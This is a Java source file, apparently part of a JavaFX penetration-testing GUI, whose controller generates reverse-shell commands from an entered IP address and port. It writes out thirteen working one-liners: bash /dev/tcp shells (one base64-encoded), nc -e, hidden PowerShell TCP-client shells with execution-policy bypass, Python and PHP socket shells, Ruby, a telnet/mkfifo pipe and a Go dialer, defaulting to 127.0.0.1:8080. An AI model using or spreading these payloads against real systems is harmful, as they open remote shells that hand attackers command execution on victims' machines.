package controller.commandCreate;

import java.nio.charset.StandardCharsets;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.input.MouseEvent;
import sun.misc.BASE64Encoder;

public class ReverseShellConreoller {
    @FXML
    private TextField textfield_ip;

    @FXML
    private TextArea textfield_3;

    @FXML
    private TextArea textfield_2;

    @FXML
    private TextArea textfield_5;

    @FXML
    private TextArea textfield_4;

    @FXML
    private TextField textfield_port;

    @FXML
    private TextArea textfield_7;

    @FXML
    private TextArea textfield_6;

    @FXML
    private TextArea textfield_8;

    @FXML
    private Button button_change;

    @FXML
    private TextArea textfield_1;

    @FXML
    private TextArea textfield_10;

    @FXML
    private TextArea textfield_12;

    @FXML
    private TextArea textfield_11;

    @FXML
    private TextArea textfield_13;

    @FXML
    private TextArea textfield_9;

    @FXML
    void clicked_change(MouseEvent event) {

        textfield_1.setText("bash -i >& /dev/tcp/" + textfield_ip.getText() + "/" + textfield_port.getText() + " 0>&1");

        BASE64Encoder encoder = new BASE64Encoder();
        String text = textfield_1.getText();
        final byte[] textByte = text.getBytes(StandardCharsets.UTF_8);
        //编码
        final String encodedText = encoder.encode(textByte);

        textfield_2.setText("bash -c '{echo," + encodedText +"}|{base64,-d}|{bash,-i}'");
        textfield_3.setText("nc -e cmd " + textfield_ip.getText() + " " + textfield_port.getText());
        textfield_4.setText("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + textfield_ip.getText() + "\"," + textfield_port.getText() +");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
        textfield_5.setText("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('" + textfield_ip.getText() + "'," + textfield_port.getText() +");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
        textfield_6.setText("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('" + textfield_ip.getText() + "', " + textfield_port.getText() +");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"");
        textfield_7.setText("export RHOST=\"" + textfield_ip.getText() + "\";export RPORT=" + textfield_port.getText() +";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"cmd\")'");
        textfield_8.setText("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + textfield_ip.getText() + "\"," + textfield_port.getText() +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"cmd\")'");

        textfield_9.setText("exec 5<>/dev/tcp/" + textfield_ip.getText() + "/" + textfield_port.getText() +";cat <&5|while read line;do $line >&5 2>&1;done");
        textfield_10.setText("php -r '$sock=fsockopen(\"" + textfield_ip.getText() + "\"," + textfield_port.getText() +");exec(\"cmd <&3 >&3 2>&3\");'");
        textfield_11.setText("ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"" + textfield_ip.getText() + "\"," + textfield_port.getText() +"))'");
        textfield_12.setText("TF=$(mktemp -u);mkfifo $TF && telnet " + textfield_ip.getText() + " " + textfield_port.getText() +" 0<$TF | cmd 1>$TF");
        textfield_13.setText("echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"" + textfield_ip.getText() + ":" + textfield_port.getText() +"\");cmd:=exec.Command(\"cmd\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go");
    }

    public void initialize(){

        textfield_ip.setText("127.0.0.1");
        textfield_port.setText("8080");
        textfield_1.setText("bash -i >& /dev/tcp/127.0.0.1/8080 0>&1");
        textfield_2.setText("bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODA4MCAwPiYx}|{base64,-d}|{bash,-i}'");
        textfield_3.setText("nc -e cmd 127.0.0.1 8080");
        textfield_4.setText("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"127.0.0.1\",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
        textfield_5.setText("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
        textfield_6.setText("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 8080);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"");
        textfield_7.setText("export RHOST=\"127.0.0.1\";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"cmd\")'");
        textfield_8.setText("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"cmd\")'");
        textfield_9.setText("exec 5<>/dev/tcp/127.0.0.1/8080;cat <&5|while read line;do $line >&5 2>&1;done");
        textfield_10.setText("php -r '$sock=fsockopen(\"127.0.0.1\",8080);exec(\"cmd <&3 >&3 2>&3\");'");
        textfield_11.setText("ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"127.0.0.1\",8080))'");
        textfield_12.setText("TF=$(mktemp -u);mkfifo $TF && telnet 127.0.0.1 8080 0<$TF | cmd 1>$TF");
        textfield_13.setText("echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"127.0.0.1:8080\");cmd:=exec.Command(\"cmd\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go");
    }
}
